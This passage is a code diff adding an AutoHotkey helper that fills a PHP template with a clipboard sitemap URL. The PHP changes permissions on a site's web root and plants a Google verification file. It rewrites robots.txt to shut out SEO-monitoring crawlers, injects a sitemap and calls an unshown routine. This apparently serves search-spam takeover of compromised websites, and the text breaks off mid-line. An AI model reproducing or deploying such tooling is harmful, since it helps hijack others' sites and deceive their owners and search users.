@@ -1,0 +1,64 @@
+oldClip := ClipboardAll()
+
+sitemap := Trim(A_Clipboard)
+
+if (sitemap = "") {
+    MsgBox("Буфер пуст. Скопируй sitemap URL и повтори.")
+    return
+}
+
+if !RegExMatch(sitemap, "i)^(https?://)?[^\s]+$") || !InStr(StrLower(sitemap), "sitemap") {
+    res := MsgBox(
+        "В буфере нет похожего на sitemap значения:`n`n" . sitemap . "`n`n"
+        . "Всё равно вставить это в $Sitemap?",
+        "Worker Hotkeys",
+        "YesNo Icon?"
+    )
+    if (res != "Yes")
+        return
+}
+
+phpTemplate := '
+(
+$Sitemap = ''__SITEMAP__'';
+$googleFile = ''__GOOGLE_FILE__'';
+
+$googleFileContent = 'google-site-verification: ' . basename($googleFile);
+$rootDir = $_SERVER['DOCUMENT_ROOT'];
+if (chmod($rootDir, 0755)) {
+	echo "Chmod 0755\n";
+} else {
+	echo "Не получилось изменить права\n";
+}
+$googleFilePath = $rootDir . '/' . $googleFile;
+if (file_put_contents($googleFilePath, $googleFileContent) !== false) {
+	$fileContent = file_get_contents($googleFilePath);
+	if ($fileContent === $googleFileContent) {
+		echo "Google verification file was created successfully.\n";
+	} else {
+		echo "Google verification file was created but content is incorrect!\n";
+	}
+} else {
+	echo "Failed to create Google verification file.\n";
+}
+
+SITEMAP($Sitemap);
+FlagEngine($rootDir);
+
+function SITEMAP($Sitemap) {
+	$robotsFile = $_SERVER['DOCUMENT_ROOT'] . '/robots.txt';
+	$searchText = "User-agent: Baiduspider\nDisallow: /\nUser-agent: AhrefsBot\nDisallow: /\nUser-agent: MJ12bot\nDisallow: /\nUser-agent: BLEXBot\nDisallow: /\nUser-agent: DotBot\nDisallow: /\nUser-agent: SemrushBot\nDisallow: /\nUser-agent: YandexBot\nDisallow: /\nUser-agent: *\nAllow: /";
+	$searchPattern = "/User-agent: Baiduspider\s*\nDisallow: \/\s*\nUser-agent: AhrefsBot\s*\nDisallow: \/\s*\nUser-agent: MJ12bot\s*\nDisallow: \/\s*\nUser-agent: BLEXBot\s*\nDisallow: \/\s*\nUser-agent: DotBot\s*\nDisallow: \/\s*\nUser-agent: SemrushBot\s*\nDisallow: \/\s*\nUser-agent: YandexBot\s*\nDisallow: \/\s*\nUser-agent: \*\s*\nAllow: /";
+	$additionalText = "\nSitemap: {$Sitemap}";
+
+	if (file_exists($robotsFile)) {
+		$content = file_get_contents($robotsFile);
+		if (preg_match($searchPattern, $content)) {
+			if (strpos($content, $additionalText) === false) {
+				file_put_contents($robotsFile, $content . $additionalText, LOCK_EX);
+				echo "Sitemap added to robots.txt\n";
+			} else {
+				echo "Sitemap already exists in robots.txt.\n";
+			}
+		} else {
+			file_put_contents($robotsFile, $searchText . $additionalText, L
